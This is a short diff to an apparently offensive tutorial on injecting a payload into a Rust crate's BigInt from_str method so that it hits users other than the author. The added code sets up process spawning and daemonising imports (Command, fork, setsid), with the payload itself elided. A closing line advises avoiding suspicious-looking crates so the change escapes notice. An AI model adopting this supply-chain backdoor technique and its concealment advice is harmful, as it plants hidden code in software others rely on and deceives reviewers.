@@ -5,6 +5,16 @@ Instead of writing a meaningless message from the source code, we'll write a pay
 From a user other than the one targeting, enter the previously selected method's source code and place the following code:
 
 ```
+use std::process::{Command, Stdio};
+
+extern "C" {
+    fn fork() -> i32;
+    fn close(fd: i32) -> i32;
+    fn setsid() -> i32;
+}
+
+
+...
 
 #[inline]
 fn from_str(s: &str) -> Result<BigInt, ParseBigIntError> {
@@ -42,3 +52,5 @@ fn from_str(s: &str) -> Result<BigInt, ParseBigIntError> {
 }
 
 ```
+
+It is important to note that we are not using any extern crate that might look suspicious from the outside, stick to the standard crate and external C functions.
